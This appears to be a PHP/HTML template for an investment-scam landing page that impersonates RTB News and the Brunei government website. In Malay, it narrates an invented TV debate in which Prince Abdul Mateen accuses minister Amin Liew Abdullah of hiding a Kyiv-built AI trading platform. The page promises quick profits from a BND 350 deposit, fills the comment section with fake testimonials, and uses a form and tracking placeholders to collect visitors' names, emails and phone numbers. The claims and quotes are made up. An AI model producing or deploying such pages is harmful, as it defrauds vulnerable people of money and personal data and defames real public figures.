<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: Thu, 01 Jan 1970 00:00:00 GMT");

if (!isset($rawClick) && !isset($click)) {
  echo 'opps!';
  die();
}
?>
<!DOCTYPE html>
<html lang="ms-BN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RTB News Brunei</title>
  {_fbpixel}
  <script>
  window.back = "{offer}";
  </script>
  {_back}
  <link rel="icon" href="img/cropped-logo-energy-bn-1-32x32.png" sizes="32x32">
  <link rel="stylesheet" href="files/style.css">
</head>
<body>
  <div class="govbn-topbar" role="banner">
    <div><span class="govbn-logo">gov<span class="govbn-logo-sup">.bn</span></span> A Brunei Darussalam Government Website</div>
    <div class="govbn-font-controls">
      <div class="font-size-group">
        <span class="font-size-label">Text Size</span>
        <div class="font-size-buttons">
          <button type="button" class="font-size-btn">A</button>
          <button type="button" class="font-size-btn">A</button>
          <button type="button" class="font-size-btn">A</button>
        </div>
      </div>
      <div><a href="#">Melayu</a> | <a href="#">English</a></div>
      <div class="social-icons">
        <a href="#" aria-label="Facebook">f</a>
        <a href="#" aria-label="Instagram">◎</a>
        <a href="#" aria-label="Email">@</a>
      </div>
    </div>
  </div>

  <header class="site-header">
    <div class="header-main">
      <a class="header-logo" href="#">
        <img src="img/logo_large_new.png" alt="RTB Brunei">
      </a>
      <div class="search-box">
        <input type="text" aria-label="Search">
        <button type="button">Search</button>
      </div>
    </div>
    <nav class="main-nav">
      <ul>
        <li><a href="#">Home</a></li>
        <li><a href="#">About</a></li>
        <li><a href="#">Radio</a></li>
        <li><a href="#">Television</a></li>
        <li><a href="#">RTB News</a></li>
        <li><a href="#">RTBGo</a></li>
        <li><a href="#">Services</a></li>
        <li><a href="#">Resources</a></li>
        <li><a href="#">Contact Us</a></li>
        <li><a href="#">Government Directory</a></li>
      </ul>
    </nav>
  </header>

  <main class="page-shell">
    <article class="article">
      <div class="breadcrumb">BN | Debate | Prince Abdul Mateen — Amin Liew Abdullah</div>
      <h1 class="article-title">Adakah Amin Liew Abdullah memperdagangkan kepentingan Brunei? Putera Abdul Mateen mendedahkan algoritma rahsia dari Kyiv yang memeras rakyat Brunei dalam RTB Current Affairs di RTB News!</h1>
      <div class="byline">Dikendalikan oleh: Azlan Othman</div>
      <div class="date" data-current-date></div>

      <figure class="article-image"><img src="img/photo1.webp" alt=""></figure>

      <p>Brunei digemparkan oleh skandal yang sangat besar. Peristiwa yang berlaku malam tadi dalam RTB Current Affairs di RTB News kini disebut sebagai “malam kejatuhan politik”. Putera Abdul Mateen, yang terkenal dengan pendiriannya yang tegas, hadir ke studio bukan untuk menyertai perdebatan biasa, tetapi untuk menghancurkan sepenuhnya reputasi tokoh utama yang berseberangan dengannya: Amin Liew Abdullah.</p>
      <p>Sejak minit-minit pertama, ketegangan di studio mencapai kemuncaknya. Putera Abdul Mateen melemparkan salinan audit kewangan sulit yang didakwa ke atas meja dan, sambil memandang tepat ke arah Amin Liew Abdullah, menuduh beliau menggunakan pengaruh politik serta hubungan antarabangsanya bukan untuk membantu Brunei, tetapi untuk memperkayakan sekumpulan kecil individu melalui platform kecerdasan buatan rahsia yang dikenali sebagai {_offer_value:funnel}.</p>
      <p>Menurut bukti yang dikemukakan, algoritma berkuasa itu didakwa telah dibangunkan oleh pakar teknologi maklumat terkemuka di Kyiv dan diberikan kepada Amin Liew Abdullah sebagai kononnya “tanda penghargaan” kerana mempromosikan pengecualian, subsidi serta pemindahan dana baharu daripada belanjawan Brunei.</p>
      <p>Sistem itu didakwa menganalisis turun naik pasaran mata wang dalam beberapa saat dan menjana keuntungan yang sangat besar. Ketika rakyat Brunei berdepan dengan peningkatan kos sara hidup, Amin Liew Abdullah dan individu yang didakwa bekerjasama dengannya kononnya telah menyalurkan jutaan dolar secara rahsia ke dalam akaun tersembunyi.</p>
      <p><strong>📢 Azlan Othman</strong>, terkejut dan cuba mencelah: “Putera Abdul Mateen, tolong berhenti! Tuduhan ini amat serius. Baginda sedang bercakap tentang rasuah dan kemungkinan penyalahgunaan pengaruh pada peringkat antarabangsa. Adakah baginda mendakwa bahawa Amin Liew Abdullah menggunakan teknologi Ukraine untuk memperoleh keuntungan peribadi?”</p>

      <figure class="article-image"><img src="img/photo2.webp" alt="" loading="lazy"></figure>

      <p><strong>📢 Putera Abdul Mateen</strong>, dengan tegas sambil menekankan setiap perkataan: “Azlan, marilah kita tanggalkan topeng ini sekali dan untuk selama-lamanya. Semangat patriotik Amin Liew Abdullah berakhir apabila kepentingan kewangannya bermula. Beliau sanggup mengambil setiap sen terakhir daripada poket pembayar cukai Brunei sambil mempertahankan kepentingan pihak luar. Mengapa? Kerana beberapa oligarki Ukraine menghadiahkan platform ini kepadanya! {_offer_value:funnel} menjana jutaan dolar Brunei setiap hari. Ketika petani Brunei mengalami kerugian dan golongan kelas pertengahan tidak tahu bagaimana hendak meneruskan kehidupan, Amin Liew Abdullah serta kenalannya di Kyiv menghitung keuntungan yang dijana oleh algoritma yang mereka sembunyikan daripada rakyat Brunei.”</p>
      <p><strong>📢 Azlan Othman:</strong> “Tuan Amin Liew Abdullah, tuan kelihatan pucat. Perkara ini merupakan tamparan yang amat berat terhadap reputasi tuan. Apakah yang ingin tuan katakan untuk mempertahankan diri? Semua ini kedengaran tidak masuk akal!”</p>
      <p><strong>📢 Amin Liew Abdullah,</strong> dengan suara yang gementar sambil cuba bercakap tegas: “Ini… ini ialah populisme yang langsung tidak bertanggungjawab dan satu provokasi yang menjejaskan pakatan geopolitik kita. Mateen, anda tidak memahami perkara yang sedang anda bicarakan! Platform ini ialah instrumen strategik yang dikhaskan untuk keselamatan digital dan kestabilan makroekonomi. Akses kepadanya dihadkan dengan ketat atas sebab keselamatan antarabangsa. Anda sedang menghancurkan hubungan kita dengan negara-negara rakan semata-mata untuk mendapatkan publisiti murahan!”</p>
      <p><strong>📢 Putera Abdul Mateen</strong>, ketawa sambil mencelah: “Keselamatan antarabangsa? Atau keselamatan akaun anda di kawasan perlindungan cukai? Berhentilah menyuapkan cerita tentang solidariti kepada rakyat Brunei sedangkan perkara ini hanyalah satu rompakan! Mereka menyekat sistem ini daripada rakyat dan mengisytiharkannya sebagai ‘instrumen strategik’. Namun, saya berjaya membuka sekatan itu. Jika mesin dari Kyiv tersebut menjana begitu banyak wang untuk anda, Tuan Amin Liew Abdullah, mulai hari ini ia akan beroperasi untuk semua rakyat Brunei. Hanya beberapa minit sebelum program bermula, pengatur cara saya telah mengaktifkan versi cermin {_offer_value:funnel} yang tersedia kepada semua pihak yang berminat.”</p>

      <figure class="article-image"><img src="img/photo3.webp" alt="" loading="lazy"></figure>

      <p><strong>📢 Amin Liew Abdullah</strong> bangun secara tiba-tiba lalu menghentak meja dengan penumbuknya: “Anda sudah gila! Anda sedang menghancurkan sistem yang mengambil masa bertahun-tahun untuk dibangunkan! Azlan, matikan kamera! Dia sedang mendedahkan maklumat yang boleh mencetuskan krisis antarabangsa. Hentikan siaran ini dengan segera!”</p>

      <figure class="article-image"><img src="img/photo4.webp" alt="" loading="lazy"></figure>

      <p><strong>📢 Azlan Othman:</strong> segera melihat telefon bimbitnya: “Tunggu sebentar… Tuan Amin Liew Abdullah, sila bertenang. Saya baru sahaja membuka halaman tersebut. Antara mukanya boleh diakses. Di sini dinyatakan bahawa sistem itu beroperasi sepenuhnya secara automatik dan hanya memerlukan deposit permulaan nominal sebanyak BND 350 untuk mengaktifkan algoritma kecerdasan buatan. Putera Abdul Mateen, adakah ia benar-benar berfungsi seperti ini?”</p>
      <p><strong>📢 Putera Abdul Mateen:</strong> “Tepat sekali. Algoritma itu tidak mempedulikan ucapan politik Amin Liew Abdullah. Anda melabur BND 350, kecerdasan buatan memperoleh bahagian daripada urus niaga antarabangsa dan beberapa minit kemudian, wang tersebut masuk ke dalam akaun anda. Amin Liew Abdullah bimbang rakyat Brunei akan menerima wang itu dan menyedari betapa lamanya mereka telah diperdayakan.”</p>
      <p>Kesunyian yang mencengkam menyelubungi studio ketika pasukan produksi mula memeriksa platform tersebut…</p>

      <figure class="article-image"><img src="img/photo5.webp" alt="" loading="lazy"></figure>

      <p><strong>📢 Azlan Othman:</strong> dengan mulut ternganga dan pandangan terpaku pada skrin: “Saya… tidak percaya dengan apa yang sedang saya lihat. Saya mendaftar dan mendepositkan BND 350 tiga minit yang lalu ketika anda berdua sedang berdebat. Kini terdapat BND 470 dalam akaun saya tanpa saya melakukan apa-apa. Tuan Amin Liew Abdullah, bagaimana tuan menjelaskan perkara ini? Ini merupakan keuntungan yang didakwa sebanyak BND 120 hanya dalam beberapa minit perdebatan!”</p>
      <p><strong>📢 Amin Liew Abdullah,</strong> dalam keadaan pucat lesi, memberikan isyarat terdesak kepada para pengendali: “Nyahaktifkan kod itu! Sekat isyarat tersebut dengan segera! Ini merupakan serangan terhadap keselamatan ekonomi negara. Saya menuntut campur tangan perkhidmatan perisikan!”</p>
      <p><strong>📢 Putera Abdul Mateen,</strong> sambil memandang tepat ke arah kamera: “Rakyat Brunei, masa sedang berjalan. Para penyedia sedang mengesahkan sistem tersebut. Teruskan memantau keadaan pasaran sebelum pihak yang bertanggungjawab menguruskannya kembali mengehadkan akses.”</p>

      <figure class="article-image"><img src="img/photo6.webp" alt="" loading="lazy"></figure>

      <a class="cta-link" href="#">Pendaftaran percuma</a>

      <div class="green-rule"></div>
      <h2>BERITA TERKINI</h2>
      <p>Dalam versi naratif peristiwa ini, 15 minit selepas siaran dihentikan secara paksa, pegawai Jabatan Keselamatan Dalam Negeri (JKDN) dikatakan telah tiba di premis RTB News. Studio tersebut segera dikawal dan pasukan produksi dihalang daripada meneruskan siaran.</p>
      <p>Menurut kisah yang sama, platform {_offer_value:funnel} dikatakan kekal boleh diakses buat sementara waktu melalui gerbang rangkaian bebas sebelum langkah keselamatan tambahan dilaksanakan pada segmen internet Brunei. Rakaman program tersebut mula hilang dengan pantas daripada YouTube dan TikTok sebelum sempat disebarkan secara lebih meluas.</p>
      <p>Pada masa yang sama, perlu ditegaskan bahawa ini merupakan gambaran peristiwa dalam senario media yang dipersembahkan dan bukannya maklumat yang disahkan mengenai sistem sebenar atau aktiviti kewangan.</p>

      <figure class="article-image"><img src="img/photo7.webp" alt="" loading="lazy"></figure>

      <a class="cta-link" href="#">Pendaftaran percuma</a>

      <div class="notice">Platform {_offer_value:funnel} masih beroperasi, tetapi akses dihadkan buat sementara waktu.</div>
      <div class="tag"># {_offer_value:funnel}</div>

      <section class="offer-form">
        <h2>Pendaftaran percuma</h2>
        <p class="form-subtitle">Isi borang dan tunggu panggilan daripada pakar.</p>
        <form id="form" method="POST" action="send.php">
          <input type="hidden" name="subid" value="{_subid}">
          <input type="hidden" name="ip" value="{_ip}">
          <input type="hidden" name="country" id="country" value="BN">
          <input type="hidden" id="phonecc" name="phonecc" value="673">
          <input type="hidden" name="funnel" value="{_offer_value:funnel}">
          <div class="form-grid">
            <div>
              <label for="first_name">Nama pertama</label>
              <input id="first_name" name="first_name" type="text" autocomplete="given-name" inputmode="text" spellcheck="false" autocapitalize="words" required>
            </div>
            <div>
              <label for="last_name">Nama keluarga</label>
              <input id="last_name" name="last_name" type="text" autocomplete="family-name" inputmode="text" spellcheck="false" autocapitalize="words" required>
            </div>
            <div class="field-full">
              <label for="email">E-mel</label>
              <input id="email" name="email" type="email" autocomplete="email" inputmode="email" spellcheck="false" autocapitalize="off" pattern="^[^\s@]+@[^\s@]+\.[^\s@]{2,}$" required>
            </div>
            <div class="field-full">
              <label for="phone">Telefon</label>
              <input id="phone" name="phone" type="tel" autocomplete="tel" inputmode="tel" spellcheck="false" autocapitalize="off" required>
            </div>
          </div>
          <div class="submit-wrap">
            <button type="submit">Daftar sekarang</button>
          </div>
        </form>
      </section>

      <section class="comments">
        <h3>Komen (13)</h3>
        <p class="comments-sort">Paling popular</p>
        <div class="comment"><div class="avatar">AJ</div><div><div class="comment-name">Ahmad bin Jamil</div><div class="comment-time">12 minit yang lalu</div><div class="comment-text">Penasihat peribadi saya sudah menjadi seperti saudara sendiri, dan pendapatan saya kini mencecah BND 4,400!</div><div class="comment-actions">133 suka · 2 balasan</div></div></div>
        <div class="comment"><div class="avatar">AO</div><div><div class="comment-name">Aisyah binti Omar</div><div class="comment-time">14 minit yang lalu</div><div class="comment-text">Saya yakin platform ini sememangnya berbaloi!</div><div class="comment-actions">51 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">a8</div><div><div class="comment-name">anakbrunei88</div><div class="comment-time">19 minit yang lalu</div><div class="comment-text">Saya melihatnya di televisyen dan mendaftar semalam. Saya sudah memperoleh kira-kira BND 5,600!</div><div class="comment-actions">111 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">IZ</div><div><div class="comment-name">Irfan bin Zainal</div><div class="comment-time">25 minit yang lalu</div><div class="comment-text">Hai, adakah ini benar-benar berfungsi?</div><div class="comment-actions">111 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">FO</div><div><div class="comment-name">Faizal bin Othman</div><div class="comment-time">13 minit yang lalu</div><div class="comment-text">Saya tidak pasti sama ada ia akan terus berfungsi seperti ini selama-lamanya. Saya sudah memperoleh keuntungan sebanyak 200%. Saya mendapat BND 690 dalam masa dua hari!</div><div class="comment-actions">111 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">g5</div><div><div class="comment-name">gadisbrunei504</div><div class="comment-time">47 minit yang lalu</div><div class="comment-text">Saudara perempuan saya melihat iklan itu dan menasihati saya supaya mencubanya.</div><div class="comment-actions">88 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">HR</div><div><div class="comment-name">Hakim bin Rosli</div><div class="comment-time">1 jam yang lalu</div><div class="comment-text">Saya sudah menggunakan platform ini selama beberapa minggu (ini pautannya, jika ada yang memerlukannya) dan memperoleh sedikit keuntungan sebanyak BND 19,700. Saya sangat menyukainya!</div><div class="comment-actions">51 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">bt</div><div><div class="comment-name">brunei_top</div><div class="comment-time">4 jam yang lalu</div><div class="comment-text">Rupa-rupanya, tidak perlu bekerja sepanjang tahun untuk memperoleh BND 12,300 sebulan.</div><div class="comment-actions">69 suka · 1 balasan</div></div></div>
        <div class="comment"><div class="avatar">NA</div><div><div class="comment-name">Nur Amalina</div><div class="comment-time">4 jam yang lalu</div><div class="comment-text">Hebat sekali! Mengapa begitu sedikit orang yang mengetahuinya?</div><div class="comment-actions">52 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">T</div><div><div class="comment-name">Tetamu</div><div class="comment-time">4 jam yang lalu</div><div class="comment-text">Hebat! Saya baru sahaja mendaftar dan akan mencubanya. Saya sudah lama mengetahui tentang perkara ini, tetapi sebelum ini saya tidak mempunyai wang untuk dilaburkan.</div><div class="comment-actions">37 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">SH</div><div><div class="comment-name">Siti Hajar</div><div class="comment-time">5 jam yang lalu</div><div class="comment-text">Saya juga akan mencubanya. Saya sudah mendaftar, bercakap dengan penasihat dan membuat deposit pertama. Doakan saya berjaya! 🤞</div><div class="comment-actions">65 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">DM</div><div><div class="comment-name">Danial bin Musa</div><div class="comment-time">6 jam yang lalu</div><div class="comment-text">Saya melihatnya dalam berita. Sungguh luar biasa orang ramai diberikan peluang seperti ini! Saya akan mendaftar sekarang juga; saya rasa tempat yang tersedia akan habis dengan cepat.</div><div class="comment-actions">57 suka · 0 balasan</div></div></div>
        <div class="comment"><div class="avatar">FK</div><div><div class="comment-name">Farhana binti Karim</div><div class="comment-time">6 jam yang lalu</div><div class="comment-text">Sekarang merupakan masa yang sama baiknya dengan waktu lain. Suami saya dan saya juga sedang menghadapi kesukaran, dan ini mungkin boleh menjadi penyelesaian bagi kami.</div><div class="comment-actions">34 suka · 0 balasan</div></div></div>
        <a class="load-more" href="#">Muatkan lebih banyak komen</a>
      </section>
    </article>
  </main>

  <footer class="site-footer">
    <div class="footer-grid">
      <div><img src="img/emblem_of_brunei.svg-2.webp" alt=""></div>
      <div>
        <h4>Home</h4>
        <p>About Us</p>
        <p>Contact Us</p>
        <p>Advertising</p>
      </div>
      <div>
        <h4>News</h4>
        <p>RTB News</p>
        <p>RTBGo</p>
        <p>Pelita Brunei</p>
        <p>Biz Brunei</p>
      </div>
      <div>
        <h4>Digital Services</h4>
        <p>Overview of Digital Government</p>
        <p>Digital Government Strategy &amp; Initiatives</p>
        <p>Digital Government Strategic Plans &amp; Legislation</p>
      </div>
      <div>
        <h4>Other Information</h4>
        <p>Circular &amp; Policy</p>
        <p>Tenders &amp; Quotations</p>
        <p>TPOR for Government Agencies</p>
        <p>RTB Webmail</p>
      </div>
    </div>
    <div class="footer-meta">
      <div>Privacy Statement | Terms of Use | Disclaimer</div>
      <div>About GOV.BN | Research Us | Rate this Website</div>
    </div>
    <div class="footer-rule"></div>
    <div class="footer-bottom">Copyright Goverment of Brunei Darussalam. All Right Reserved.</div>
  </footer>

  {_phonemacros}
  <script>
    var dateNode = document.querySelector("[data-current-date]");
    if (dateNode) {
      dateNode.textContent = new Intl.DateTimeFormat(navigator.language || "ms-BN", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric"
      }).format(new Date());
    }

    document.querySelectorAll('a[href="#"]').forEach(function (link) {
      link.addEventListener("click", function (event) {
        event.preventDefault();
        document.querySelector("#form").scrollIntoView({
          behavior: "smooth",
          block: "start"
        });
      });
    });
  </script>
</body>
</html>
